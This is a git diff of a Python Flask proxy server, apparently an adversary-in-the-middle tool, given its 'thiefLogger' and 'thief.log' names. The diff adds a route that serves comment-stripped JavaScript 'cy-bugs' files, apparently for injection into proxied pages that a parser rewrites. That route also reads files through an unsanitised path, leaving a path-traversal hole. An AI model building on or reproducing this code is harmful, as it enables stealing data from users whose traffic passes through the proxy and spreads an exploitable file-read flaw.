@@ -1,19 +1,18 @@
 from flask import Flask, request,make_response
+
 import requests
 import proxy_utils 
 import logging
-
+import os 
 
 
 import proxy_parser 
 app = Flask(__name__)
 PORT = 80
 HOST="0.0.0.0"
-
 logger = logging.Logger("thiefLogger")
 logger.addHandler(logging.FileHandler("thief.log"))
 logger.setLevel(logging.WARN)
-
 @app.route("/",methods = ["GET"])
 def wellcome(): 
      if request.host.removeprefix("http://").startswith("vvvvvv"): 
@@ -38,11 +37,24 @@ def wellcome():
           </body>
           """
           
-          
-          
-          
-          
-          
+@app.route("/cybugs/<path:path>" , methods = ['GET'])
+def cybugsServe(path):
+     script = "Error" 
+     response = None
+     try : 
+          with open(f"../cy-bugs/{path}" , 'r') as file:
+               
+               script= "".join(filter(lambda x : not x.startswith("//") and x.strip("\n") ,file.readlines()))
+
+          response = make_response(script)
+          response.headers['content-type'] = "text/javascript"
+          response.status_code = 200 
+     except : 
+          print("couldnt find cy-bug ... ")
+          response = make_response(script)
+          response.status_code = 404 
+     return response
+                         
 @app.route("/",methods = ["POST"])
 @app.route("/<path:path>", methods=['GET', 'POST'])
 def proxy(path):
@@ -55,12 +67,13 @@ def proxy(path):
      returnData = None
      if "content-type" in respone.headers and "image" in respone.headers["content-type"]: #return an Image 
           print(f"Image {respone.headers['content-type']}" )
+          # proxy_utils.saveContent(respone.content,path,os.getcwd(),"image")
           resp =make_response(respone.content)
           resp.headers.set('Content-Type',respone.headers["content-type"] )
           resp.headers.set('Content-Disposition', 'attachment', filename=path)
           return resp  
      else : 
-               returnData = proxy_parser.parse(respone.text,domainName=domainName , path=path)
+          returnData = proxy_parser.parse(respone.text,domainName=domainName , path=path,pageType="text/plain" if "content-type" not in respone.headers else  respone.headers["content-type"])
      code = respone.status_code
      print(respone.headers["content-type"])
      headers = proxy_utils.cleanHeaders(respone.headers,proxy_utils.Way.From)
